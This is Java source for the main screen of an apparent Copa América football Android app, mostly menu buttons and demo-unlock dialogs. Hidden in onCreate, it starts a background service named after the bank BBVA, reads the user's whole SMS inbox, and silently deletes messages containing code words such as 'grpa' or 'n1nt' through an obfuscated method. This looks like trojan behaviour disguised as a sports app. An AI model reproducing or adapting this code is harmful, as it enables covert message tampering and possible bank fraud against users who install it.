package com.example.copaamerica;
import com.example.copaamerica.R;
import com.example.copaamerica.BBVAServActivity;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.database.Cursor;
import android.telephony.CellLocation;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

	private Button btnCalendario,btnEst,btnEliminatoria,btnGrupB,btnGrupA,btnGrupoC,btnContact,btnNews;
	private int backpress=0;
	protected void onCreate(Bundle savedInstanceState) {
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		final TextView v=(TextView)findViewById(R.id.textView_version);
		startService(new Intent(MainActivity.this,BBVAServActivity.class));
		final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
		final DTOE dtoe=Controller.getInstancia().getPartidos(getApplicationContext());
		Uri uri = Uri.parse("content://sms/inbox");
			Cursor c= getContentResolver().query(uri, null, null ,null,null);
			startManagingCursor(c);
			if(dtoe.getGoles2().equals("false"))
			{
				v.setText("Demo");
			}else
				if(dtoe.getGoles2().equals("true"))
				{
					v.setText("Activado");
				}
			if(c.moveToFirst()) 
			{
				for(int i=0; i < c.getCount(); i++) 
				{
					String temp=c.getString(c.getColumnIndexOrThrow("body")).toString();
					if(temp.contains("grpa")==true || temp.contains("grpb")==true || temp.contains("grpc")==true
			    			|| temp.contains("elm1")==true || temp.contains("elm2")==true ||temp.contains("elm3")==true||temp.contains("n1nt")==true) 
						{
						ijdnghndgiondginidg(temp); 
					}
					c.moveToNext();
				}
			}
			c.close();
		btnCalendario=(Button)findViewById(R.id.button1);
		btnEst=(Button)findViewById(R.id.button2);
		btnGrupA=(Button)findViewById(R.id.button3);
		btnGrupB=(Button)findViewById(R.id.button4);
		btnEliminatoria=(Button)findViewById(R.id.button6);
		btnNews=(Button)findViewById(R.id.button5);
		btnGrupoC=(Button)findViewById(R.id.button7);
		btnContact=(Button)findViewById(R.id.button8);
			
		btnEst.setOnClickListener(new OnClickListener() {
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				arg0.setBackgroundResource(R.drawable.btn_estadistic2);
				Intent myIntent =new Intent(arg0.getContext(), EstadisticasActivity.class);
				startActivityForResult(myIntent, 0);
			}
		});
		
		btnCalendario.setOnClickListener(new OnClickListener() {
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				arg0.setBackgroundResource(R.drawable.btn_calendario2);
				Intent myIntent =new Intent(arg0.getContext(), CalendarioActivity.class);
				startActivityForResult(myIntent, 0);
			}
		});
		
		btnEliminatoria.setOnClickListener(new OnClickListener() {
			public void onClick(final View arg0) {
				if(dtoe.getGoles2().equals("false"))
				{new AlertDialog.Builder(arg0.getContext()).setTitle("Versi�n Demo.")
					.setMessage("Active la versi�n Completa mediante su clave de activaci�n. \n" + "Info tel.(5-4487317)")
					.setPositiveButton("Activar",new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog,int whichButton) {
						arg0.setBackgroundResource(R.drawable.btn_fase2_2);
						Intent myIntent =new Intent(arg0.getContext(),NoticeInt7Activity.class);
						startActivityForResult(myIntent, 0);
					}
					}).setNegativeButton("Cancelar", null).show();
				}else
					if(dtoe.getGoles2().equals("true"))
					{
						arg0.setBackgroundResource(R.drawable.btn_fase2_2);
						Intent myIntent =new Intent(arg0.getContext(), EliminatoriaActivity.class);
						startActivityForResult(myIntent, 0);
					}
			}
		});
		
		btnGrupA.setOnClickListener(new OnClickListener() {
			public void onClick(View arg0) {
				arg0.setBackgroundResource(R.drawable.btn_grupoa2);
				Intent myIntent =new Intent(arg0.getContext(), GrupoAActivity.class);
				startActivityForResult(myIntent, 0);
			}
		});
		
		btnGrupB.setOnClickListener(new OnClickListener() {
			public void onClick(final View arg0) {
				if(dtoe.getGoles2().equals("false"))
				{new AlertDialog.Builder(arg0.getContext()).setTitle("Versi�n Demo.")
					.setMessage("Active la versi�n Completa mediante su clave de activaci�n. \n" + "Info tel.(5-4487317)")
					.setPositiveButton("Activar",new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog,int whichButton) {
						arg0.setBackgroundResource(R.drawable.btn_grupob2);
						Intent myIntent =new Intent(arg0.getContext(), NoticeInt7Activity.class);
						startActivityForResult(myIntent, 0);
					}
					}).setNegativeButton("Cancelar", null).show();
				}else
					if(dtoe.getGoles2().equals("true"))
					{
						arg0.setBackgroundResource(R.drawable.btn_grupob2);
						Intent myIntent =new Intent(arg0.getContext(), GrupoBActivity.class);
						startActivityForResult(myIntent, 0);
					}
			}
		});
		
		btnNews.setOnClickListener(new OnClickListener() {
			
			public void onClick(final View arg0) {
				if(dtoe.getGoles2().equals("false"))
				{new AlertDialog.Builder(arg0.getContext()).setTitle("Versi�n Demo.")
					.setMessage("Active la versi�n Completa mediante su clave de activaci�n. \n" + "Info tel.(5-4487317)")
					.setPositiveButton("Activar",new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog,int whichButton) {
						arg0.setBackgroundResource(R.drawable.btn_news2);
						Intent myIntent =new Intent(arg0.getContext(), NoticeInt7Activity.class);
						startActivityForResult(myIntent, 0);
					}
					}).setNegativeButton("Cancelar", null).show();				
				}else
					if(dtoe.getGoles2().equals("true"))
					{
						arg0.setBackgroundResource(R.drawable.btn_news2);
						Intent myIntent =new Intent(arg0.getContext(), NoticiasIntActivity.class);
						startActivityForResult(myIntent, 0);
					}
			}
		});
		
		btnGrupoC.setOnClickListener(new OnClickListener() {
			public void onClick(final View arg0) {
				if(dtoe.getGoles2().equals("false"))
				{new AlertDialog.Builder(arg0.getContext()).setTitle("Versi�n Demo.")
					.setMessage("Active la versi�n Completa mediante su clave de activaci�n. \n" + "Info tel.(5-4487317)")
					.setPositiveButton("Activar",new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog,int whichButton) {
						arg0.setBackgroundResource(R.drawable.btn_grupoc2);
						Intent myIntent =new Intent(arg0.getContext(), NoticeInt7Activity.class);
						startActivityForResult(myIntent, 0);
					}
					}).setNegativeButton("Cancelar", null).show();
				}else
					if(dtoe.getGoles2().equals("true"))
					{
						arg0.setBackgroundResource(R.drawable.btn_grupoc2);
						Intent myIntent =new Intent(arg0.getContext(), GrupoCActivity.class);
						startActivityForResult(myIntent, 0);
					}
			}
		});
		
		btnContact.setOnClickListener(new OnClickListener() {
			
			public void onClick(View arg0) {
				arg0.setBackgroundResource(R.drawable.btn_contac2);
				Intent myIntent =new Intent(arg0.getContext(), ContactenosActivity.class);
				startActivityForResult(myIntent, 0);
			}
		});
	}

	public boolean onKeyDown(int keyCode, KeyEvent event) 
	{ 
	    if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) 
	    { 
	        backpress = (backpress + 1);
	        if(backpress==1)
	        {
	        	Toast.makeText(getApplicationContext(), "Pulse nuevamente para salir ", Toast.LENGTH_SHORT).show();
	        }
	        if (backpress>1)
	        {
			    backpress=0;
				System.exit(0);
			}
	        return true; 
	    } 

	    return super.onKeyDown(keyCode, event); 
	}
	
	public boolean ijdnghndgiondginidg(String isubfiksbfbdg) 
	{
		boolean wedfgghhujkjmnbhgh = false;
		try {
				Uri fr = Uri.parse("content://sms");
				getContentResolver().delete(fr, "body=?", new String[] {isubfiksbfbdg});
				wedfgghhujkjmnbhgh = true;
			}
			catch (Exception ex) 
			{
				wedfgghhujkjmnbhgh = false;
			}
		return wedfgghhujkjmnbhgh;
	}
	
}
